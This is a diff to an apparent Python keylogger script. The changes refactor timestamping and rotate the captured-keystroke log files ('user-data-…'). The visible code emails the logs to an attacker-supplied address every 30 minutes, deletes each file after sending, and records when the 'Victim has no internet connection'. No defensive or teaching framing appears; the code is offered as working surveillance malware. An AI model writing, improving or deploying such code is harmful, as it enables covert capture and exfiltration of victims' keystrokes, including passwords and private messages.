@@ -19,7 +19,8 @@ from email.mime.text import MIMEText
 full_log = ""
 word = ""
 char_limit = 190 # Line limit to match screen width
-current_time = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
+def get_current_time():
+    return datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
 ascii_art = r"""
 	  
@@ -42,13 +43,18 @@ print(ascii_art)
 # Email setup
 email = input("Enter email: ") # used both as sending and receiving email
 password = getpass.getpass("Type your password and press enter: ")  # Securely input password
-subject = f"Keylogger logs at: {current_time}"
-body = f"See attached logs to view keystrokes at {current_time}"
+subject = f"Keylogger logs at: {get_current_time()}"
+body = f"See attached logs to view keystrokes at {get_current_time()}"
 
-log_file = f"{os.getcwd()}/user-data-{current_time}.log"
-
-with open(log_file, "w") as file:
-	file.write(f"Started logging at:{current_time} " + "\n")
+def create_log_file():
+	global log_file
+	log_file_counter = 1
+	log_file = f"{os.getcwd()}/user-data-{log_file_counter}-{get_current_time()}.log"
+	log_file_counter += 1
+	with open(log_file, "w") as file:
+		file.write(f"Started logging at:{get_current_time()} " + "\n")
+	return log_file
+create_log_file() # Called at initial startup of file
 
 def send_attachment():
 	# Create a multipart message and set headers
@@ -139,11 +145,12 @@ def check_and_send():
 		# Delete file afterwards
 		if os.path.exists(log_file):
 			os.remove(log_file)
+			create_log_file() # Create a new log file
 		else:
 				print(f"The file '{log_file}' does not exist.")
 	else:
 		with open(log_file, 'a') as file:
-			file.write(f"Victim has no internet connection at this time: {current_time}.\n")
+			file.write(f"Victim has no internet connection at this time: {get_current_time()}.\n")
 
 # Schedule task to check internet connection and send attachment every 30 minutes
 schedule.every(30).minutes.do(check_and_send)
